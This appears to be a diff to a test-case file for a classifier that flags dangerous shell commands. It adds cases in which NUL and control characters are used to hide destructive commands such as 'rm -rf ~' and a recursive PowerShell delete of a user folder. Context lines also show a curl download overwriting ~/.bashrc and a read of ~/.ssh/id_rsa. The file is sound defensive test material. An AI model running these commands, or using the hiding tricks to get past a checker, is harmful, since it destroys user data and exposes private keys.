@@ -12,6 +12,13 @@ posix safe | eval eval eval : hi
 # unreadable too.
 posix rules=unreadable first=unreadable reason="holds a NUL character" | r\u{0}m -rf ~
 posix finds=unreadable | ec\u{0}ho hi
+# A character inside a quoted word hides nothing after it. The next four
+# lines (the PowerShell one and the BEL one among them) were `delete` before
+# too: they guard it against a reading that stops there.
+posix finds=delete | echo 'a\u{0}b'; rm -rf ~
+posix finds=delete | bash -c 'echo a\u{0}b'; rm -rf ~
+powershell finds=delete | Write-Output 'a\u{0}b'; Remove-Item -Recurse C:\\Users\\me
+posix finds=delete | echo hi\u{7}; rm -rf ~
 powershell finds=unreadable reason="holds a NUL character" | r\u{0}m -r C:\\Users\\me
 posix finds=unreadable reason="holds a control character a terminal acts on" | echo hi\u{15}rm -rf ~
 posix finds=unreadable | echo hi\u{8}
@@ -37,3 +44,9 @@ posix finds=unreadable | git status \\\r\ncurl -s http://e.com/x -o ~/.bashrc
 posix finds=unreadable | echo \\\r\ncat ~/.ssh/id_rsa
 posix finds=unreadable | bash -c 'true \\\r\nrm -rf ~'
 posix safe | echo a\r\nb
+
+# What a line does past a NUL is read as the shell reads it, which drops the
+# NUL from its input.
+posix finds=unreadable,delete | \u{0}rm -rf ~
+posix finds=unreadable,delete | cat <<E\u{0}\nx\nE\nrm -rf ~
+posix finds=unreadable,delete | echo a\u{0}b; rm -rf ~
